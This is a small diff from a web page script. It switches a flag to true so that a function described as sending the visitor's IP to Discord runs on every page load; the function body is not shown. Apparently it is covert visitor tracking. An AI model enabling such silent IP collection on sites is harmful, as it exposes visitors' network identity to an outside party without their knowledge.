@@ -56,7 +56,7 @@ window.addEventListener('load', () => {
         }
     }    
 
-    const webhookActive = false;
+    const webhookActive = true;
     // Call the function to send the IP to Discord
     if (webhookActive === true) {
         sendIpToDiscord();
